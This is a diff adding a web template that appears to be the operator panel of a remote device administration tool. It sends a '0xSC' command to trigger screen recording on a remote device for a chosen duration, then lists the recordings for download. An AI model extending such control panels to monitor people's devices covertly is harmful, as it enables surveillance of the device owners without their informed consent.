@@ -1,0 +1,128 @@
+<div class="ui segment">
+    <div>
+        <div class="ui action input fluid">
+            <input type="number" placeholder="Duration (seconds)" min="1" max="300" id="seconds" value="30">
+            <button onclick="recordScreen(this)" class="ui red left labeled icon button">
+                <i class="video icon"></i>
+                Record Screen
+            </button>
+        </div>
+        <div class="ui attached progress indicating active" id="recProg" style="display: none;">
+            <div class="bar"></div>
+        </div>
+    </div>
+
+    <div class="ui info message" style="margin-top: 20px;">
+        <div class="header">Screen Recording Instructions</div>
+        <ul class="list">
+            <li>Enter the duration in seconds (1-300 seconds, default: 30)</li>
+            <li>Click "Record Screen" to start recording</li>
+            <li>The device will request screen capture permission - user must grant it</li>
+            <li>Recording will start automatically after permission is granted</li>
+            <li>Video will appear in the list below when recording completes</li>
+        </ul>
+    </div>
+
+    <table class="ui celled table">
+        <thead>
+            <tr>
+                <th>Time</th>
+                <th>Name</th>
+                <th>Size</th>
+                <th>Duration</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            <% if (pageData && pageData.length > 0) { 
+                pageData.forEach((item) => { 
+                    let date = new Date(item.time);
+            %>
+            <tr>
+                <td class="collapsing"><%= date.toLocaleString('en-GB', { timeZone: 'UTC' }) %></td>
+                <td><%= item.originalName || 'screen_recording.mp4' %></td>
+                <td class="collapsing"><%= item.size ? (item.size / 1024 / 1024).toFixed(2) + ' MB' : 'Unknown' %></td>
+                <td class="collapsing"><%= item.duration ? item.duration + 's' : 'N/A' %></td>
+                <td class="collapsing">
+                    <div class="ui buttons">
+                        <a href="<%= item.path %>" download="<%= item.originalName || 'screen_recording.mp4' %>"
+                            class="ui positive button">
+                            <i class="download icon"></i> Download
+                        </a>
+                    </div>
+                </td>
+            </tr>
+            <% }); 
+            } else { %>
+            <tr>
+                <td colspan="5" class="center aligned">
+                    <div class="ui message">
+                        <p>No screen recordings yet. Start a recording to see it here.</p>
+                    </div>
+                </td>
+            </tr>
+            <% } %>
+        </tbody>
+    </table>
+
+    <script>
+        function recordScreen(element) {
+            $(element).addClass('loading');
+            let sec = $('#seconds').val() || 30;
+            
+            // Validate duration
+            if (sec < 1) sec = 1;
+            if (sec > 300) sec = 300;
+            
+            // Send command: 0xSC:duration
+            sendCommand('0xSC', { duration: sec }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error);
+                        $(element).removeClass('loading');
+                    }, 300);
+                } else {
+                    setTimeout(() => {
+                        $(element).removeClass('loading');
+                        
+                        // Show progress bar
+                        $('#recProg').show();
+                        
+                        // Estimate time: recording duration + processing time (add 10 seconds buffer)
+                        let timeLeft = ((parseInt(sec) + 10) * 1000);
+                        let timeItsGonnaTake = (parseInt(sec) + 10);
+                        
+                        if (message === 'Requested' || message === false) {
+                            showNotification('#2ecc71', 'Screen recording requested! User must grant permission on device. Check back in ' + timeItsGonnaTake + ' seconds for the result!');
+                            
+                            let cdInterval = setInterval(() => {
+                                timeLeft = timeLeft - 100;
+                                let percent = Math.min(100, (((timeItsGonnaTake * 1000) - timeLeft) / (timeItsGonnaTake * 1000)) * 100);
+                                $('#recProg').progress({ percent: percent });
+                                
+                                if (timeLeft <= 0) {
+                                    clearInterval(cdInterval);
+                                    $('#recProg').hide();
+                                    // Reload page to show new recording
+                                    setTimeout(() => {
+                                        window.location.reload();
+                                    }, 2000);
+                                }
+                            }, 100);
+                        } else {
+                            showNotification('#2ecc71', message || 'Screen recording started!');
+                            $('#recProg').hide();
+                        }
+                    }, 300);
+                }
+            });
+        }
+    </script>
+
+</div>
+
+
+
+
+
+
